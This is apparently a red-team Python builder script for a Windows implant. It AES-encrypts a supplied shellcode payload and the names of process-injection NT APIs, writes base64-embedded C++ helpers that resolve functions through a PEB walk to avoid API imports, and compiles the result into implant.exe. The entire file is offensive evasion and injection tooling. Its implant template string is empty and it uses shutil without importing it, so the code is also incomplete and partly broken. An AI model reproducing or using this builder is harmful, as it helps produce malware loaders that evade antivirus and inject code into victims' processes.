import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib
import subprocess
import base64 as b64
import os

KEY = urandom(16)

def pad(s):
	return s.decode('latin-1') + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv.encode('latin'))

	return cipher.encrypt(bytes(plaintext.encode('latin')))

def replace_text(file_text, encoded_text, placeholder):
	return file_text.replace(placeholder.encode(), encoded_text.encode())


def main():
	try:
	    payload_text = open(sys.argv[1], "rb").read()
	except:
	    print("File argument needed! %s <raw payload file>" % sys.argv[0])
	    sys.exit()

	NtOpenProc = "NtOpenProcess"
	NtAllocVirtMem = "NtAllocateVirtualMemory"
	NtWriteVirtMem = "NtWriteVirtualMemory"
	NtProtVirtMem = "NtProtectVirtualMemory"
	NtCreateThrEx = "NtCreateThreadEx"

	# Base64 encoded source files and compile script
	b64_implant_template_cpp = ""
	b64_compile_bat = "QEVDSE8gT0ZGCgpjbC5leGUgL25vbG9nbyAvT3ggL01UIC9XMCAvR1MtIC9ETkRFQlVHIC9UcCBzcmNcXCouY3BwIC9saW5rIC9PVVQ6aW1wbGFudC5leGUgL1NVQlNZU1RFTTpDT05TT0xFCnJlbSBDbGVhbmluZyB1cC4uLgpkZWwgKi5vYmo="
	b64_helpers_cpp = "LyoKIFJlZCBUZWFtIE9wZXJhdG9yIGhlbHBlciBmdW5jdGlvbnMKCiBhdXRob3I6IHJlZW56MGggKHR3aXR0ZXI6IEBTRUtUT1I3bmV0KQogY3JlZGl0czogemVyb3N1bTB4MCwgc3BlZWRpMTMKIAoqLwoKI2luY2x1ZGUgIlBFc3RydWN0cy5oIgojaW5jbHVkZSAiaGVscGVycy5oIgojaW5jbHVkZSA8c3RkaW8uaD4KCnR5cGVkZWYgSE1PRFVMRSAoV0lOQVBJICogTG9hZExpYnJhcnlfdCkoTFBDU1RSIGxwRmlsZU5hbWUpOwpMb2FkTGlicmFyeV90IHBMb2FkTGlicmFyeUEgPSBOVUxMOwoKCgpITU9EVUxFIFdJTkFQSSBobHBHZXRNb2R1bGVIYW5kbGUoTFBDV1NUUiBzTW9kdWxlTmFtZSkgewoKCS8vIGdldCB0aGUgb2Zmc2V0IG9mIFByb2Nlc3MgRW52aXJvbm1lbnQgQmxvY2sKI2lmZGVmIF9NX0lYODYgCglQRUIgKiBQcm9jRW52QmxrID0gKFBFQiAqKSBfX3JlYWRmc2R3b3JkKDB4MzApOwojZWxzZQoJUEVCICogUHJvY0VudkJsayA9IChQRUIgKilfX3JlYWRnc3F3b3JkKDB4NjApOwojZW5kaWYKCgkvLyByZXR1cm4gYmFzZSBhZGRyZXNzIG9mIGEgY2FsbGluZyBtb2R1bGUKCWlmIChzTW9kdWxlTmFtZSA9PSBOVUxMKSAKCQlyZXR1cm4gKEhNT0RVTEUpIChQcm9jRW52QmxrLT5JbWFnZUJhc2VBZGRyZXNzKTsKCglQRUJfTERSX0RBVEEgKiBMZHIgPSBQcm9jRW52QmxrLT5MZHI7CglMSVNUX0VOVFJZICogTW9kdWxlTGlzdCA9IE5VTEw7CgkKCU1vZHVsZUxpc3QgPSAmTGRyLT5Jbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgKiAgcFN0YXJ0TGlzdEVudHJ5ID0gTW9kdWxlTGlzdC0+Rmxpbms7CgoJZm9yIChMSVNUX0VOVFJZICogIHBMaXN0RW50cnkgID0gcFN0YXJ0TGlzdEVudHJ5OyAgCQkvLyBzdGFydCBmcm9tIGJlZ2lubmluZyBvZiBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdAoJCQkJCSAgIHBMaXN0RW50cnkgIT0gTW9kdWxlTGlzdDsJICAgIAkvLyB3YWxrIGFsbCBsaXN0IGVudHJpZXMKCQkJCQkgICBwTGlzdEVudHJ5ICA9IHBMaXN0RW50cnktPkZsaW5rKQl7CgkJCgkJLy8gZ2V0IGN1cnJlbnQgRGF0YSBUYWJsZSBFbnRyeQoJCUxEUl9EQVRBX1RBQkxFX0VOVFJZICogcEVudHJ5ID0gKExEUl9EQVRBX1RBQkxFX0VOVFJZICopICgoQllURSAqKSBwTGlzdEVudHJ5IC0gc2l6ZW9mKExJU1RfRU5UUlkpKTsKCgkJLy8gY2hlY2sgaWYgbW9kdWxlIGlzIGZvdW5kIGFuZCByZXR1cm4gaXRzIGJhc2UgYWRkcmVzcwoJCWlmIChsc3RyY21waVcocEVudHJ5LT5CYXNlRGxsTmFtZS5CdWZmZXIsIHNNb2R1bGVOYW1lKSA9PSAwKQoJCQlyZXR1cm4gKEhNT0RVTEUpIHBFbnRyeS0+RGxsQmFzZTsKCX0KCgkvLyBvdGhlcndpc2U6CglyZXR1cm4gTlVMTDsKCn0KCkZBUlBST0MgV0lOQVBJIGhscEdldFByb2NBZGRyZXNzKEhNT0RVTEUgaE1vZCwgY2hhciAqIHNQcm9jTmFtZSkgewoKCWNoYXIgKiBwQmFzZUFkZHIgPSAoY2hhciAqKSBoTW9kOwoKCS8vIGdldCBwb2ludGVycyB0byBtYWluIGhlYWRlcnMvc3RydWN0dXJlcwoJSU1BR0VfRE9TX0hFQURFUiAqIHBEb3NIZHIgPSAoSU1BR0VfRE9TX0hFQURFUiAqKSBwQmFzZUFkZHI7CglJTUFHRV9OVF9IRUFERVJTICogcE5USGRyID0gKElNQUdFX05UX0hFQURFUlMgKikgKHBCYXNlQWRkciArIHBEb3NIZHItPmVfbGZhbmV3KTsKCUlNQUdFX09QVElPTkFMX0hFQURFUiAqIHBPcHRpb25hbEhkciA9ICZwTlRIZHItPk9wdGlvbmFsSGVhZGVyOwoJSU1BR0VfREFUQV9ESVJFQ1RPUlkgKiBwRXhwb3J0RGF0YURpciA9IChJTUFHRV9EQVRBX0RJUkVDVE9SWSAqKSAoJnBPcHRpb25hbEhkci0+RGF0YURpcmVjdG9yeVtJTUFHRV9ESVJFQ1RPUllfRU5UUllfRVhQT1JUXSk7CglJTUFHRV9FWFBPUlRfRElSRUNUT1JZICogcEV4cG9ydERpckFkZHIgPSAoSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERhdGFEaXItPlZpcnR1YWxBZGRyZXNzKTsKCgkvLyByZXNvbHZlIGFkZHJlc3NlcyB0byBFeHBvcnQgQWRkcmVzcyBUYWJsZSwgdGFibGUgb2YgZnVuY3Rpb24gbmFtZXMgYW5kICJ0YWJsZSBvZiBvcmRpbmFscyIKCURXT1JEICogcEVBVCA9IChEV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZkZ1bmN0aW9ucyk7CglEV09SRCAqIHBGdW5jTmFtZVRibCA9IChEV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZk5hbWVzKTsKCVdPUkQgKiBwSGludHNUYmwgPSAoV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZk5hbWVPcmRpbmFscyk7CgoJLy8gZnVuY3Rpb24gYWRkcmVzcyB3ZSdyZSBsb29raW5nIGZvcgoJdm9pZCAqcFByb2NBZGRyID0gTlVMTDsKCgkvLyByZXNvbHZlIGZ1bmN0aW9uIGJ5IG9yZGluYWwKCWlmICgoKERXT1JEX1BUUilzUHJvY05hbWUgPj4gMTYpID09IDApIHsKCQlXT1JEIG9yZGluYWwgPSAoV09SRCkgc1Byb2NOYW1lICYgMHhGRkZGOwkvLyBjb252ZXJ0IHRvIFdPUkQKCQlEV09SRCBCYXNlID0gcEV4cG9ydERpckFkZHItPkJhc2U7CQkJLy8gZmlyc3Qgb3JkaW5hbCBudW1iZXIKCgkJLy8gY2hlY2sgaWYgb3JkaW5hbCBpcyBub3Qgb3V0IG9mIHNjb3BlCgkJaWYgKG9yZGluYWwgPCBCYXNlIHx8IG9yZGluYWwgPj0gQmFzZSArIHBFeHBvcnREaXJBZGRyLT5OdW1iZXJPZkZ1bmN0aW9ucykKCQkJcmV0dXJuIE5VTEw7CgoJCS8vIGdldCB0aGUgZnVuY3Rpb24gdmlydHVhbCBhZGRyZXNzID0gUlZBICsgQmFzZUFkZHIKCQlwUHJvY0FkZHIgPSAoRkFSUFJPQykgKHBCYXNlQWRkciArIChEV09SRF9QVFIpIHBFQVRbb3JkaW5hbCAtIEJhc2VdKTsKCX0KCS8vIHJlc29sdmUgZnVuY3Rpb24gYnkgbmFtZQoJZWxzZSB7CgkJLy8gcGFyc2UgdGhyb3VnaCB0YWJsZSBvZiBmdW5jdGlvbiBuYW1lcwoJCWZvciAoRFdPUkQgaSA9IDA7IGkgPCBwRXhwb3J0RGlyQWRkci0+TnVtYmVyT2ZOYW1lczsgaSsrKSB7CgkJCWNoYXIgKiBzVG1wRnVuY05hbWUgPSAoY2hhciAqKSBwQmFzZUFkZHIgKyAoRFdPUkRfUFRSKSBwRnVuY05hbWVUYmxbaV07CgkKCQkJaWYgKHN0cmNtcChzUHJvY05hbWUsIHNUbXBGdW5jTmFtZSkgPT0gMCkJewoJCQkJLy8gZm91bmQsIGdldCB0aGUgZnVuY3Rpb24gdmlydHVhbCBhZGRyZXNzID0gUlZBICsgQmFzZUFkZHIKCQkJCXBQcm9jQWRkciA9IChGQVJQUk9DKSAocEJhc2VBZGRyICsgKERXT1JEX1BUUikgcEVBVFtwSGludHNUYmxbaV1dKTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJfQoKCS8vIGNoZWNrIGlmIGZvdW5kIFZBIGlzIGZvcndhcmRlZCB0byBleHRlcm5hbCBsaWJyYXJ5LmZ1bmN0aW9uCglpZiAoKGNoYXIgKikgcFByb2NBZGRyID49IChjaGFyICopIHBFeHBvcnREaXJBZGRyICYmIAoJCShjaGFyICopIHBQcm9jQWRkciA8IChjaGFyICopIChwRXhwb3J0RGlyQWRkciArIHBFeHBvcnREYXRhRGlyLT5TaXplKSkgewoJCQoJCWNoYXIgKiBzRndkRExMID0gX3N0cmR1cCgoY2hhciAqKSBwUHJvY0FkZHIpOyAJLy8gZ2V0IGEgY29weSBvZiBsaWJyYXJ5LmZ1bmN0aW9uIHN0cmluZwoJCWlmICghc0Z3ZERMTCkgcmV0dXJuIE5VTEw7CgoJCS8vIGdldCBleHRlcm5hbCBmdW5jdGlvbiBuYW1lCgkJY2hhciAqIHNGd2RGdW5jdGlvbiA9IHN0cmNocihzRndkRExMLCAnLicpOwoJCSpzRndkRnVuY3Rpb24gPSAwOwkJCQkJLy8gc2V0IHRyYWlsaW5nIG51bGwgYnl0ZSBmb3IgZXh0ZXJuYWwgbGlicmFyeSBuYW1lIC0+IGxpYnJhcnlceDBmdW5jdGlvbgoJCXNGd2RGdW5jdGlvbisrOwkJCQkJCS8vIHNoaWZ0IGEgcG9pbnRlciB0byB0aGUgYmVnaW5uaW5nIG9mIGZ1bmN0aW9uIG5hbWUKCgkJLy8gcmVzb2x2ZSBMb2FkTGlicmFyeSBmdW5jdGlvbiBwb2ludGVyLCBrZWVwIGl0IGFzIGdsb2JhbCB2YXJpYWJsZQoJCWlmIChwTG9hZExpYnJhcnlBID09IE5VTEwpIHsKCQkJcExvYWRMaWJyYXJ5QSA9IChMb2FkTGlicmFyeV90KSBobHBHZXRQcm9jQWRkcmVzcyhobHBHZXRNb2R1bGVIYW5kbGUoTCJLRVJORUwzMi5ETEwiKSwgIkxvYWRMaWJyYXJ5QSIpOwoJCQlpZiAocExvYWRMaWJyYXJ5QSA9PSBOVUxMKSByZXR1cm4gTlVMTDsKCQl9CgoJCS8vIGxvYWQgdGhlIGV4dGVybmFsIGxpYnJhcnkKCQlITU9EVUxFIGhGd2QgPSBwTG9hZExpYnJhcnlBKHNGd2RETEwpOwoJCWZyZWUoc0Z3ZERMTCk7CQkJCQkJCS8vIHJlbGVhc2UgdGhlIGFsbG9jYXRlZCBtZW1vcnkgZm9yIGxpYi5mdW5jIHN0cmluZyBjb3B5CgkJaWYgKCFoRndkKSByZXR1cm4gTlVMTDsKCgkJLy8gZ2V0IHRoZSBhZGRyZXNzIG9mIGZ1bmN0aW9uIHRoZSBvcmlnaW5hbCBjYWxsIGlzIGZvcndhcmRlZCB0bwoJCXBQcm9jQWRkciA9IGhscEdldFByb2NBZGRyZXNzKGhGd2QsIHNGd2RGdW5jdGlvbik7Cgl9CgoJcmV0dXJuIChGQVJQUk9DKSBwUHJvY0FkZHI7Cn0="
	b64_helpers_h = "I3ByYWdtYSBvbmNlCgojaW5jbHVkZSA8d2luZG93cy5oPgojaW5jbHVkZSA8bWFsbG9jLmg+CgpITU9EVUxFIFdJTkFQSSBobHBHZXRNb2R1bGVIYW5kbGUoTFBDV1NUUiBzTW9kdWxlTmFtZSk7CkZBUlBST0MgV0lOQVBJIGhscEdldFByb2NBZGRyZXNzKEhNT0RVTEUgaE1vZCwgY2hhciAqIHNQcm9jTmFtZSk7"
	b64_pestructs_h = "I3ByYWdtYSBvbmNlCgojaW5jbHVkZSA8d2luZG93cy5oPgoKLy9odHRwczovL3Byb2Nlc3NoYWNrZXIuc291cmNlZm9yZ2UuaW8vZG9jL250cHNhcGlfOGhfc291cmNlLmh0bWwjbDAwMDYzCnN0cnVjdCBQRUJfTERSX0RBVEEKewoJVUxPTkcgTGVuZ3RoOwoJQk9PTEVBTiBJbml0aWFsaXplZDsKCUhBTkRMRSBTc0hhbmRsZTsKCUxJU1RfRU5UUlkgSW5Mb2FkT3JkZXJNb2R1bGVMaXN0OwoJTElTVF9FTlRSWSBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgSW5Jbml0aWFsaXphdGlvbk9yZGVyTW9kdWxlTGlzdDsKCVBWT0lEIEVudHJ5SW5Qcm9ncmVzczsKCUJPT0xFQU4gU2h1dGRvd25JblByb2dyZXNzOwoJSEFORExFIFNodXRkb3duVGhyZWFkSWQ7Cn07Ci8vaHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2RvYy9udHBlYnRlYl84aF9zb3VyY2UuaHRtbCNsMDAwMDgKc3RydWN0IFBFQgp7CglCT09MRUFOIEluaGVyaXRlZEFkZHJlc3NTcGFjZTsKCUJPT0xFQU4gUmVhZEltYWdlRmlsZUV4ZWNPcHRpb25zOwoJQk9PTEVBTiBCZWluZ0RlYnVnZ2VkOwoJdW5pb24KCXsKCQlCT09MRUFOIEJpdEZpZWxkOwoJCXN0cnVjdAoJCXsKCQkJQk9PTEVBTiBJbWFnZVVzZXNMYXJnZVBhZ2VzIDogMTsKCQkJQk9PTEVBTiBJc1Byb3RlY3RlZFByb2Nlc3MgOiAxOwoJCQlCT09MRUFOIElzSW1hZ2VEeW5hbWljYWxseVJlbG9jYXRlZCA6IDE7CgkJCUJPT0xFQU4gU2tpcFBhdGNoaW5nVXNlcjMyRm9yd2FyZGVycyA6IDE7CgkJCUJPT0xFQU4gSXNQYWNrYWdlZFByb2Nlc3MgOiAxOwoJCQlCT09MRUFOIElzQXBwQ29udGFpbmVyIDogMTsKCQkJQk9PTEVBTiBJc1Byb3RlY3RlZFByb2Nlc3NMaWdodCA6IDE7CgkJCUJPT0xFQU4gU3BhcmVCaXRzIDogMTsKCQl9OwoJfTsKCUhBTkRMRSBNdXRhbnQ7CglQVk9JRCBJbWFnZUJhc2VBZGRyZXNzOwoJUEVCX0xEUl9EQVRBKiBMZHI7CgkvLy4uLgp9OwoKc3RydWN0IFVOSUNPREVfU1RSSU5HCnsKCVVTSE9SVCBMZW5ndGg7CglVU0hPUlQgTWF4aW11bUxlbmd0aDsKCVBXQ0ggQnVmZmVyOwp9OwoJCi8vaHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2RvYy9udGxkcl84aF9zb3VyY2UuaHRtbCNsMDAxMDIKc3RydWN0IExEUl9EQVRBX1RBQkxFX0VOVFJZCnsKCUxJU1RfRU5UUlkgSW5Mb2FkT3JkZXJMaW5rczsKCUxJU1RfRU5UUlkgSW5NZW1vcnlPcmRlckxpbmtzOwoJdW5pb24KCXsKCQlMSVNUX0VOVFJZIEluSW5pdGlhbGl6YXRpb25PcmRlckxpbmtzOwoJCUxJU1RfRU5UUlkgSW5Qcm9ncmVzc0xpbmtzOwoJfTsKCVBWT0lEIERsbEJhc2U7CglQVk9JRCBFbnRyeVBvaW50OwoJVUxPTkcgU2l6ZU9mSW1hZ2U7CglVTklDT0RFX1NUUklORyBGdWxsRGxsTmFtZTsKCVVOSUNPREVfU1RSSU5HIEJhc2VEbGxOYW1lOwoJLy8uLi4KfTs="
	b64_structs_h = ""

	# Make directory structure and write source files
	if not os.path.exists("src"):
		os.mkdir("src")
	else:
		print("[*] Clearing src folder to avoid compilation issues...")
		folder = 'src\\'
		for filename in os.listdir(folder):
		    file_path = os.path.join(folder, filename)
		    try:
		        if os.path.isfile(file_path) or os.path.islink(file_path):
		            os.unlink(file_path)
		        elif os.path.isdir(file_path):
		            shutil.rmtree(file_path)
		    except Exception as e:
		        print('Failed to delete %s. Reason: %s' % (file_path, e))

	with open("src\\compile.bat", "w") as f:
		f.write(b64.b64decode(b64_compile_bat).decode())

	with open("src\\helpers.cpp", "w") as f:
		f.write(b64.b64decode(b64_helpers_cpp).decode())

	with open("src\\helpers.h", "w") as f:
		f.write(b64.b64decode(b64_helpers_h).decode())

	with open("src\\PEstructs.h", "w") as f:
		f.write(b64.b64decode(b64_pestructs_h).decode())

	with open("src\\structs.h", "w") as f:
		f.write(b64.b64decode(b64_structs_h).decode())
	
	# Get initial content of implant-template.cpp file
	implant_text = b64.b64decode(b64_implant_template_cpp)


	# Generate encoded versions of payload and function names
	print("[*] Generating encoded payload and strings...\n")

	enc_payload = aesenc(payload_text, KEY)
	enc_NtOpenProc = aesenc(bytes((NtOpenProc+"\x00").encode()), KEY)
	enc_NtAllocVirtMem = aesenc(bytes((NtAllocVirtMem+"\x00").encode()), KEY)
	enc_NtWriteVirtMem = aesenc(bytes((NtWriteVirtMem+"\x00").encode()), KEY)
	enc_NtProtVirtMem = aesenc(bytes((NtProtVirtMem+"\x00").encode()), KEY)
	enc_NtCreateThrEx = aesenc(bytes((NtCreateThrEx+"\x00").encode()), KEY)

	# Update format of each to match what is needed in source file
	print("[*] Formating encoded strings to fit into C++ source file...\n")

	formatted_key = '{ 0x' + ', 0x'.join(format(x, '02x') for x in KEY) + ' };'
	formatted_payload = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_payload) + ' };'
	formatted_NtOpenProc = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtOpenProc) + ' };'
	formatted_NtAllocVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtAllocVirtMem) + ' };'
	formatted_NtWriteVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtWriteVirtMem) + ' };'
	formatted_NtProtVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtProtVirtMem) + ' };'
	formatted_NtCreateThrEx = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtCreateThrEx) + ' };'

	# Replace the placeholders in implant.cpp with the encoded byte arrays
	print("[*] Replacing placeholders in implant.cpp with encrypted and formatted payloads...\n")

	implant_text = replace_text(implant_text, formatted_key, "[AESKEY]")
	implant_text = replace_text(implant_text, formatted_payload, "[ENCODED_PAYLOAD]")
	implant_text = replace_text(implant_text, formatted_NtOpenProc, "[ENCODED_NTOPENPROC]")
	implant_text = replace_text(implant_text, formatted_NtAllocVirtMem, "[ENCODED_NTALLOCVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtWriteVirtMem, "[ENCODED_NTWRITEVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtProtVirtMem, "[ENCODED_NTPROTVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtCreateThrEx, "[ENCODED_NTCREATETHREX]")
	
	# Write updated text to implant.cpp file
	print("[*] Writing updated text to implant.cpp...\n")
	
	with open("src\\implant.cpp", "w") as f:
		f.write(implant_text.decode('utf-8'))
		
	
	# Compile C++ file with provided compile.bat script
	print("[*] Compiling implant.cpp with provided compile.bat file...\n")
	
	subprocess.check_output("src\\compile.bat", stderr=subprocess.STDOUT, shell=True)
	
	
	print("[+] Check the current directory for the new 'implant.exe' file.")


if __name__ == "__main__":
	main()